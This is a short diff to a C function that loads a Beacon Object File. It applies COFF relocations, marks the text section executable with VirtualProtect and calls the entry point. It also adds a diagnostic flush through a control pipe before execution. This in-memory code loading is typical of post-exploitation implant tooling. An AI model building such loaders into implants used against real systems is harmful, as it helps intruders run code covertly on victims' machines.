@@ -454,6 +454,10 @@ static int run_bof(char * wire, int wireLen) {
 			/* beacon process_reloc semantics: the site's existing bytes are
 			 * the linker addend - read and add them (COFF section-symbol
 			 * relocs carry the in-section offset as the site addend). */
+			} else {
+				continue;
+			}
+
 			if (rtype == 1) { /* ADDR64 */
 				long long addend;
 				memcpy(&addend, siteBase + offset, 8);
@@ -482,6 +486,12 @@ static int run_bof(char * wire, int wireLen) {
 		DWORD old;
 		typedef void (*ENTRYFN)(char *, int);
 		ENTRYFN fn;
+		/* C-23: flush the diag BEFORE exec - if the BOF crashes we still
+		 * get the parse state out through the control pipe. */
+		if (g_outLen > 0 && g_ctrl != INVALID_HANDLE_VALUE) {
+			flush_output_ctrl(g_ctrl);
+			g_outLen = 0;
+		}
 		VirtualProtect(secs[SEC_TEXT], seclen[SEC_TEXT] > 0 ? seclen[SEC_TEXT] : 1, PAGE_EXECUTE_READ, &old);
 		fn = (ENTRYFN)(secs[SEC_TEXT] + entry);
 		fn(args, argLen);
